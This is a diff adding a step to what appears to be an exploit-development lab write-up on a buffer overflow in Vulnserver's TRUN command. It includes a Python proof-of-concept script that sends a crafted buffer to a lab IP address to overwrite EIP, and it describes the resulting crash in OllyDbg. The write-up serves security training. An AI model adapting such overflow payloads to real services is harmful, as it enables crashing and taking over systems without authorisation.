@@ -73,3 +73,25 @@ EIP address is 386F4337. Use the Metasploit pattern offset utility to identify w
 ![trun-eip-overwrite-media-03](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-03.png)
 
 An exact match was found at offset 2003 bytes.  Modify the buffer in the POC script to now send 2003 "A" characters, 4 "B" characters, and 1993 "C" characters; this should overwrite EIP with 4 "B" characters while retaining a 4000 byte buffer size.
+
+	Vulnserver TRUN Python Script: Control
+		#!/usr/bin/python
+		import socket
+		import os
+		import sys
+
+		crash="A"*2003 + "B"*4 + "C"*1993
+
+		buffer="TRUN /.:/"
+		buffer+=crash
+
+		print "[*] Sending evil TRUN request to VulnServer, OS-42279"
+		expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+		expl.connect(("192.168.83.128", 9999))
+		expl.send(buffer)
+		expl.close()
+
+Running the updated script against the Vulnserver crashes the server and produces the following EIP output in OllyDbg.
+
+![trun-eip-overwrite-media-04](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-04.png)
+![trun-eip-overwrite-media-05](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-05.png)
